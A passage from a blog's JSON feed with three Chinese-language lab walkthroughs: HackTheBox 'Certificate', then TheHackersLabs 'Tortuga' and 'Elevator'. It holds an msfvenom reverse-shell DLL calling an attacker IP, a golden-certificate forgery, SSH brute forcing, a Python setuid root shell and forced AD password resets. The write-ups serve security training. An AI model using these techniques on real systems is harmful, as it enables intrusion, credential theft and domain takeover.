https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n                                        \nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> \n```\n\n发现 `RYAN.K` 用户有 `SeManageVolumePrivilege` 权限\n\n```bash\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                      State\n============================= ================================ =======\nSeMachineAccountPrivilege     Add workstations to domain       Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking         Enabled\nSeManageVolumePrivilege       Perform volume maintenance tasks Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set   Enabled\n```\n\n## SeManageVolumePrivilege 滥用\n\n> 找到一些利用文档和POC：https://github.com/CsEnox/SeManageVolumeExploit | https://cn-sec.com/archives/3100947.html\n> \n\n改权限大致是让我们能拥有写入 `C` 盘的权限\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> echo '1' > ../../../1.txt\nAccess to the path 'C:\\1.txt' is denied.\nAt line:1 char:1\n+ echo '1' > ../../../1.txt\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException\n    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand\n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> upload SeManageVolumeExploit.exe\n                                        \nInfo: Uploading /root/Desktop/HackTheBox/Certificate/SeManageVolumeExploit.exe to C:\\Users\\Ryan.K\\Documents\\SeManageVolumeExploit.exe\n                                        \nData: 16384 bytes of 16384 bytes copied\n                                        \nInfo: Upload successful!\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> ./SeManageVolumeExploit.exe\nEntries changed: 859\n\nDONE\n```\n\n成功写入 `C` 盘\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> echo '1' > ../../../1.txt\n```\n\n### DLL hijack？\n\n`POC`链接中的`DLL`劫持无法使用，因为没有存在 `spool` 文件夹\n\n```bash\n*Evil-WinRM* PS C:\\windows\\system32> cmd /c dir | findstr spoo\n11/26/2024  07:02 PM            93,184 spoolss.dll\n11/26/2024  07:03 PM           564,224 winspool.drv\n```\n\n但是可以劫持别的`DLL` \n\n> https://github.com/xct/SeManageVolumeAbuse\n> \n\n这里有别的`DLL`劫持方法，同时系统也存在该`DLL`\n\n```bash\n*Evil-WinRM* PS C:\\windows\\system32\\wbem> cmd /c dir | findstr tzres\n06/02/2025  09:33 AM             9,216 tzres.dll\n```\n\n```bash\n➜  Certificate msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.45 LPORT=1234 -f dll -o tzres.dll \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of dll file: 9216 bytes\nSaved as: tzres.dll\n```\n\n但是最后 `systeminfo` `Access is denied`\n\n```bash\n*Evil-WinRM* PS C:\\windows\\system32\\wbem> systeminfo\nProgram 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1\n+ systeminfo\n+ ~~~~~~~~~~.\nAt line:1 char:1\n+ systeminfo\n+ ~~~~~~~~~~\n    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException\n    + FullyQualifiedErrorId : NativeCommandFailed\n```\n\n### CA.pfx\n\n佬们给出了另外一个方案，拥有`SeManageVolumePrivilege` 权限后可以通过`certuil` 来导出证书\n\n枚举`CA`\n\n```bash\n➜  Certificate certipy-ad find -u sara.b -p 'Blink182' -dc-ip 10.10.11.71 -text\n```\n\n![image.png](/post-images/HackTheBoxSeason8%20-%20Certificate/image12.png)\n\n导出`CA`的证书\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> certutil -exportPFX my \"Certificate-LTD-CA\" C:\\Users\\Public\\ca.pfx\nmy \"Personal\"\n================ Certificate 2 ================\nSerial Number: 75b2f4bbf31f108945147b466131bdca\nIssuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb\n NotBefore: 11/3/2024 3:55 PM\n NotAfter: 11/3/2034 4:05 PM\nSubject: CN=Certificate-LTD-CA, DC=certificate, DC=htb\nCertificate Template Name (Certificate Type): CA\nCA Version: V0.0\nSignature matches Public Key\nRoot Certificate: Subject matches Issuer\nTemplate: CA, Root Certification Authority\nCert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8\n  Key Container = Certificate-LTD-CA\n  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958\n  Provider = Microsoft Software Key Storage Provider\nSignature test passed\nEnter new password for output file C:\\Users\\Public\\ca.pfx:\nEnter new password:\nConfirm new password:\nCertUtil: -exportPFX command completed successfully.\n```\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Ryan.K\\Documents> download ../../Public/ca.pfx\n                                        \nInfo: Downloading C:\\Users\\Ryan.K\\Documents\\../../Public/ca.pfx to ca.pfx\n                                        \nInfo: Download successful!\n```\n\n- CertUtil 会打开“my”证书存储（Personal/My），找到**主题名称 (Subject Name / Issued To)** 或**友好名称 (Friendly Name)**为“`Certificate-LTD-CA`”的那张证书\n- 然后把这张证书及其私钥（以及可能的证书链）打包成一个 PFX 文件\n- 最终会在 `C:\\Users\\Public\\ca.pfx` 位置生成一个二进制的 PFX 文件\n\n### Golden certificate\n\n拿到 `ca.pfx` 的证书公私钥后可以进行黄金证书（Golden certificate）攻击\n\n> https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate\n> \n\n伪造`administrator` 的证书\n\n```bash\n➜  Certificate certipy-ad forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out administrator_forge.pfx\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Saving forged certificate and private key to 'administrator_forge.pfx'\n[*] Wrote forged certificate and private key to 'administrator_forge.pfx'\n```\n\n使用证书获取`TGT`\n\n```bash\n➜  Certificate certipy-ad auth -pfx administrator_forge.pfx -dc-ip 10.10.11.71 -domain certificate.htb -username administrator\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'administrator@certificate.htb'\n[*] Using principal: 'administrator@certificate.htb'\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to 'administrator.ccache'\n[*] Wrote credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6\n```\n\n`root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop> type root.txt\n7d69ba1c8bb2ee23ff27f0e1610caa3b\n```\n\n## 总结\n\n任重道远，不会的还是多…比如利用`certutil`来导出证书这一点，以及文件上传的`ZipSlip` ，总的也是学习到了新东西",
            "url": "https://www.sunsetaction.top/2025/10/13/HackTheBoxSeason8 - Certificate",
            "title": "HackTheBox - Machine - Certificate",
            "summary": "Season8 Certificate https://app.hackthebox.com/machines/Certificate | Windows | Hard 前期踩点 刚刚尝试了SMB无法使用匿名账户进行访问，因为还扫描到了80端口，所以从Web下手 Web 访问 HTTP 并采集指纹 ...",
            "date_modified": "2025-06-02T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "HackTheBox",
                "Windows",
                "ADCS",
                "GoldenCertificate",
                "seManageVolumePrivilegem",
                "ZipSlip"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/01/TheHackersLabsTortuga",
            "content_html": "\n# Tortuga\n\n> https://labs.thehackerslabs.com/machine/131\n> \n\n![image.png](/post-images/TheHackersLabsTortuga/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  Tortuga nmap -sT -min-rate 10000 -p- 192.168.56.120\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:50 CST\nNmap scan report for 192.168.56.120\nHost is up (0.00076s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.92 seconds\n```\n\n```bash\n➜  Tortuga nmap -sT -A -p 22,80 192.168.56.120                                            \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 16:51 CST\nNmap scan report for 192.168.56.120\nHost is up (0.00040s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)\n| ssh-hostkey: \n|   256 bd:bc:74:bc:a6:ab:09:29:2d:88:42:16:91:93:b1:a4 (ECDSA)\n|_  256 3b:99:fe:7e:ab:ae:b3:a7:05:b2:d1:73:08:6e:e7:a9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Isla Tortuga\nMAC Address: 08:00:27:FE:83:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.40 ms 192.168.56.120\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.53 seconds\n```\n\n### 枚举\n\nHTTP\n\n![image.png](/post-images/TheHackersLabsTortuga/image1.png)\n\n页面中的两个链接\n\n```bash\nLa Tripulación de Tortuga 海龟船员\n\n    Capitán Barbanegra – Estratega implacable. 黑胡子船长 – 无情的战略家。\n    Corsario Rojo – Maestro de la espada.\n    红色海盗船 – 剑之大师。\n    Grumete Verde – Aprendiz despistado. 绿色小屋男孩 – 心不在焉的学徒。\n    Timón de Hierro – El que nunca pierde el rumbo.\n    铁舵——永不迷路的人。\n\n\"Quien domine el timón hallará el rumbo a la victoria...\"\n“谁主宰舵，谁就会找到胜利之路......”\n\n\"Recuerda: el viejo truco de las rutas dobles siempre funciona...\"\n“记住：双路线的老把戏总是有效的......”\n```\n\n```bash\nMapa de Isla Tortuga 托尔图加岛地图\n\n~~~~~~~~~~~~~~~~~~~\n~     PIRATE BAY   ~\n~~~~~~~~~~~~~~~~~~~\n       |   |\n       |   |    X  (tesoro enterrado)\n       |   |\n~~~~~~~~~~~~~~~~~~~\n~     PUERTO       ~\n~~~~~~~~~~~~~~~~~~~\n    \n\nUna nota arrugada se lee en la esquina del mapa...\n地图的角落里写着一张皱巴巴的纸条......\n\n\"Ey grumete revisa la nota oculta que dejado en tu camarote...\"\n“嘿，船舱男孩，检查一下我留在你船舱里的隐藏纸条......”\n```\n\n“`grumete` 检查船舱里的隐藏纸条“ 感觉是一个目录或者用户\n\n目录扫描无结果\n\n```bash\n➜  Tortuga gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip -u http://192.168.56.120/grumete\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.120/grumete\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\nProgress: 661680 / 661683 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\n进行 `ssh` 爆破\n\n```bash\n➜  Tortuga hydra -l grumete -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.120 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-01 17:10:39\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.120:22/\n[STATUS] 121.00 tries/min, 121 tries in 00:01h, 14344278 to do in 1975:48h, 8 active\n[STATUS] 120.00 tries/min, 360 tries in 00:03h, 14344039 to do in 1992:14h, 8 active\n[STATUS] 121.29 tries/min, 849 tries in 00:07h, 14343550 to do in 1971:03h, 8 active\n[22][ssh] host: 192.168.56.120   login: grumete   password: 1234\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-01 17:19:48\n```\n\n得到密码 `1234`\n\n进去后能读取 user.txt\n\n```bash\ngrumete@TheHackersLabs-Tortuga:~$ cat user.txt \nc3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 权限提升\n\n### 信息收集\n\n家目录下 `.nota.txt` 得到一个密码 `mar_de_fuego123`\n\n```\ngrumete@TheHackersLabs-Tortuga:~$ cat .nota.txt\nQuerido grumete,\n\nParto rumbo a la isla vecina por asuntos que no pueden esperar, estaré fuera un par de días.\nMientras tanto, confío en ti para que cuides del barco y de la tripulación como si fueran míos.\n\nLa puerta de la cámara del timón está asegurada con la contraseña:\n    \"mar_de_fuego123\"\n\nRecuerda, no se la reveles a nadie más. Has demostrado ser leal y firme durante todos estos años\nnavegando juntos, y eres en quien más confío en estos mares traicioneros.\n\nMantén la guardia alta, vigila las provisiones y cuida de que ningún intruso ponga un pie en cubierta.\nCuando regrese, espero encontrar el barco tal y como lo dejo hoy (¡y nada de usar la bodega de ron\npara hacer carreras de tortugas otra vez!).\n\nCon la confianza de siempre,\n— El Capitán\n```\n\n是用户 capitan 的密码\n\n![image.png](/post-images/TheHackersLabsTortuga/image2.png)\n\n上传 `linepas` 扫一波，发现 python 设置了特殊权限\n\n![image.png](/post-images/TheHackersLabsTortuga/image3.png)\n\n- **`setcap`**: 这是用来设置文件 Capabilities 的命令。\n- **`cap_setuid`**: 这是要授予的具体能力。`CAP_SETUID` 允许一个进程改变其 UID（用户ID）。这是 SUID (Set User ID) 权限的核心能力。拥有这个能力的进程可以调用 `setuid(0)` 来将自己变成 root 用户。\n- **`=ep`**: 这指定了要将 `cap_setuid` 添加到哪些 Capability 集合中。\n    - **`e` (Effective)**: 有效集合。表示当程序运行时，这个能力**立即生效**。这是提权的关键。\n    - **`p` (Permitted)**: 许可集合。表示程序被**允许**拥有这个能力，即使它暂时没有使用。\n- **`/usr/bin/python3.11`**: 这是被赋予能力的目标文件，即 Python 3.11 的可执行程序。\n\n```bash\ncapitan@TheHackersLabs-Tortuga:/tmp$ /usr/bin/python3.11 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nroot@TheHackersLabs-Tortuga:/tmp# \n```\n\n读取 root.txt\n\n```bash\nroot@TheHackersLabs-Tortuga:/root# cat root.txt \nc3fxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n```",
            "url": "https://www.sunsetaction.top/2025/10/01/TheHackersLabsTortuga",
            "title": "TheHackersLabs - Tortuga",
            "summary": "Tortuga https://labs.thehackerslabs.com/machine/131 Recon PortScan 枚举 HTTP 页面中的两个链接 “grumete 检查船舱里的隐藏纸条“ 感觉是一个目录或者用户 目录扫描无结果 进行 ssh 爆破 得到密码 1234 进去后能读...",
            "date_modified": "2025-10-01T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "Brute",
                "Cappbilities"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/29/TheHackersLabsElevator",
            "content_html": "\n# Elevator\n\n> https://labs.thehackerslabs.com/machine/126\n> \n\n![image.png](/post-images/TheHackersLabsElevator/image.png)\n\n作者给了一个账户\n\n```bash\nUser john.smith\nPassword Rk436\\#Z4&\n```\n\n## Recon\n\n### PortScan\n\n```bash\n➜  ~ nmap -sP 10.0.250.0/24                  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:20 CST\nNmap scan report for 10.0.250.1\nHost is up (0.00072s latency).\nMAC Address: 08:00:27:8F:2A:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 10.0.250.3\nHost is up (0.00057s latency).\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 10.0.250.4\nHost is up.\nNmap done: 256 IP addresses (3 hosts up) scanned in 28.12 seconds\n```\n\n```bash\n➜  ~ nmap -sT -min-rate 10000 -p- 10.0.250.3    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:21 CST\nStrange read error from 10.0.250.3 (104 - 'Connection reset by peer')\nNmap scan report for 10.0.250.3\nHost is up (0.00098s latency).\nNot shown: 65513 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49664/tcp open  unknown\n49668/tcp open  unknown\n49674/tcp open  unknown\n49676/tcp open  unknown\n49680/tcp open  unknown\n49687/tcp open  unknown\n49692/tcp open  unknown\n49711/tcp open  unknown\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```bash\n➜  ~ nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 10.0.250.3     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-29 14:24 CST\nNmap scan report for 10.0.250.3\nHost is up (0.00070s latency).\n\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-29 06:24:32Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: bloodhound.thl, Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp open  mc-nmf        .NET Message Framing\nMAC Address: 08:00:27:F5:3D:B0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022|2016|11|10 (95%)\nOS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_10\nAggressive OS guesses: Microsoft Windows Server 2022 (95%), Microsoft Windows Server 2016 (91%), Microsoft Windows 11 21H2 (90%), Microsoft Windows 10 (86%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: ELEVATOR; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -38s\n| smb2-time: \n|   date: 2025-09-29T06:24:37\n|_  start_date: N/A\n|_nbstat: NetBIOS name: ELEVATOR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f5:3d:b0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.70 ms 10.0.250.3\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.85 seconds\n```\n\n### 枚举\n\nSMB 枚举，下载了一些文件，不过都是没什么用的\n\n![image.png](/post-images/TheHackersLabsElevator/image1.png)\n\n查看一下用户权限\n\n```bash\n➜  Elevator nxc ldap 10.0.250.3 -u 'john.smith' -p 'Rk436\\#Z4&'\nLDAP        10.0.250.3      389    ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)\nLDAP        10.0.250.3      389    ELEVATOR         [+] bloodhound.thl\\john.smith:Rk436\\#Z4&\n\n➜  Elevator nxc winrm 10.0.250.3 -u 'john.smith' -p 'Rk436\\#Z4&'\nWINRM       10.0.250.3      5985   ELEVATOR         [*] Windows Server 2022 Build 20348 (name:ELEVATOR) (domain:bloodhound.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       10.0.250.3      5985   ELEVATOR         [-] bloodhound.thl\\john.smith:Rk436\\#Z4& \n```\n\n上 `bloodhound`\n\n```bash\n➜  Elevator bloodhound-python -d bloodhound.thl -u 'john.smith' -p 'Rk436\\#Z4&' -c all --zip -dc bloodhound.thl -ns 10.0.250.3\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: bloodhound.thl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: bloodhound.thl\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: bloodhound.thl\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 9 users\nINFO: Found 57 groups\nINFO: Found 2 gpos\nINFO: Found 4 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: elevator.bloodhound.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250929144249_bloodhound.zip\n```\n\n## 横向移动\n\n### ADDSelf\n\n允许 `john.smith` 将自己添加到 `Finanzas` 组中\n\n![image.png](/post-images/TheHackersLabsElevator/image2.png)\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436\\#Z4&' add groupMember FINANZAS john.smith\n[+] john.smith added to FINANZAS\n```\n\n### Force Change Password\n\n然后 `FINANZAS` 组队 `MARY.JOHNSON` 用户有 `GenericAll` 权限\n\n![image.png](/post-images/TheHackersLabsElevator/image3.png)\n\n直接修改其密码\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'john.smith' -p 'Rk436\\#Z4&' set password mary.johnson admin12345\n[+] Password changed successfully!\n```\n\n接着 `MARY.JOHNSON` 又可以修改 `ROBERT.WILLIAMS` 的密码\n\n![image.png](/post-images/TheHackersLabsElevator/image4.png)\n\n```bash\n\t➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'mary.johnson' -p 'admin12345' set password ROBERT.WILLIAMS admin12345\n[+] Password changed successfully!\n```\n\n### WriteDACL 滥用\n\n`ROBERT.WILLIAMS` 拥有对 `PATRICIA.BROWN` 的 `WriteDacl` 权限\n\n![image.png](/post-images/TheHackersLabsElevator/image5.png)\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' get writable\n\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=bloodhound,DC=thl\npermission: WRITE\n\ndistinguishedName: CN=Robert Williams,OU=marketing,DC=bloodhound,DC=thl\npermission: WRITE\n\ndistinguishedName: CN=Patricia Brown,CN=Users,DC=bloodhound,DC=thl\nDACL: WRITE\n```\n\n要将 WriteDacl 滥用到用户对象，您可以授予自己 GenericAll 权限\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' add genericAll PATRICIA.BROWN ROBERT.WILLIAMS\n[+] ROBERT.WILLIAMS has now GenericAll on PATRICIA.BROWN\n```\n\n再强制修改其密码\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'ROBERT.WILLIAMS' -p 'admin12345' set password PATRICIA.BROWN admin12345\n[+] Password changed successfully!\n```\n\n### ADDSelf - 2\n\n用户 `PATRICIA.BROWN@BLOODHOUND.THL` 有权修改组 `OPERACIONES@BLOODHOUND.THL` 的所有者\n\n![image.png](/post-images/TheHackersLabsElevator/image6.png)\n\n那么就将其的所有者修改为自己，然后再将自己添加进去\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' set owner OPERACIONES PATRICIA.BROWN\n[+] Old owner S-1-5-21-3580157585-956322742-780763674-512 is now replaced by PATRICIA.BROWN on OPERACIONES\n```\n\n```bash\n➜  Elevator dacledit.py -action 'write' -rights 'WriteMembers' -principal 'PATRICIA.BROWN' -target-dn 'CN=OPERACIONES,OU=OPERACIONES,DC=BLOODHOUND,DC=THL' 'bloodhound.thl'/'PATRICIA.BROWN':'admin12345'\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] DACL backed up to dacledit-20250929-155416.bak\n[*] DACL modified successfully!\n```\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' add groupMember OPERACIONES PATRICIA.BROWN\n[+] PATRICIA.BROWN added to OPERACIONES\n```\n\n到这里卡住了，因为没有任何路径，SMB 也枚举过了，故查看 WP，发现 `OPERACIONES` 应该对 Jones 有 `genericAll` 权限的，但是我这里没有，询问了佬们得知是需要重新导入\n\n### Force Change Password - 2\n\n重新导入后，可以看到对 `Jones` 有权限了\n\n![image.png](/post-images/TheHackersLabsElevator/image7.png)\n\n所以是一条路径下来的\n\n![image.png](/post-images/TheHackersLabsElevator/image8.png)\n\n强制修改密码\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'PATRICIA.BROWN' -p 'admin12345' set password MICHAEL.JONES admin12345\n[+] Password changed successfully!\n```\n\n给自己 `jones` 添加到远程组里\n\n```bash\n➜  Elevator bloodyAD -d 'bloodhound.thl' --dc-ip 10.0.250.3 -u 'MICHAEL.JONES' -p 'admin12345' add groupMember 'Usuarios de administración remota' MICHAEL.JONES\n[+] MICHAEL.JONES added to Usuarios de administración remota\n```\n\n使用 `evil-winrm` 进行登录\n\n![image.png](/post-images/TheHackersLabsElevator/image9.png)\n\n```bash\n*Evil-WinRM* PS C:\\Users\\administrador\\desktop> type root.txt\naxxxxxxxxxxxxxxxxxxxxxxxxxxx6\n*Evil-WinRM* PS C:\\Users\\administrador\\desktop> type user.txt\nbxxxxxxxxxxxxxxxxxxxxxxxxxxxe\n```\n\n## 总结\n\n爽？",
            "url": "https://www.sunsetaction.top/2025/09/29/TheHackersLabsElevator",
            "title": "TheHackersLabs - Elevator",
            "summary": "Elevator https://labs.thehackerslabs.com/machine/126 作者给了一个账户 Recon PortScan 枚举 SMB 枚举，下载了一些文件，不过都是没什么用的 查看一下用户权限 上 bloodhound 横向移动 ADDSelf 允许 john.sm...",
            "date_modified": "2025-09-29T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "AD"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/28/TheHackersLabsPa Que Aiga Lujo",
